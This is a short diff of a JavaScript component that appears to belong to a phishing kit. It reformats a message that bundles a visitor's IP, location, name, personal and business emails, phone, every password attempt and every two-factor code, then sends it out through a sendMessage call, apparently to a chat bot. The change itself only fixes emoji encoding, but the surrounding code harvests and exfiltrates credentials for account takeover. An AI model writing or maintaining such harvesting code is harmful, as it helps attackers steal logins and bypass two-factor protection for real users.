@@ -374,21 +374,19 @@ const Index = () => {
             ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
             : '   Code1: <code>N/A</code>';
 
-        const message = `
-ΓÅ░ ${formatDateTime()}
-≡ƒîÉ IP: <code>${escapeHtml(safeIp)}</code>
-≡ƒôì Location: ${escapeHtml(formattedLocation)}
-≡ƒôï <b>INFO</b>
+        const message = `\u23F0 ${formatDateTime()}
+\u{1F310} IP: <code>${escapeHtml(safeIp)}</code>
+\u{1F4CD} Location: ${escapeHtml(formattedLocation)}
+\u{1F4CB} <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
    DN Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-≡ƒöÉ <b>PASSWORD</b>
+\u{1F510} <b>PASSWORD</b>
 ${passwordLines}
-≡ƒöÆ <b>2FA CODE</b>
-${twoFALines}
-`;
+\u{1F512} <b>2FA CODE</b>
+${twoFALines}`;
         sendMessage(message);
     };
 
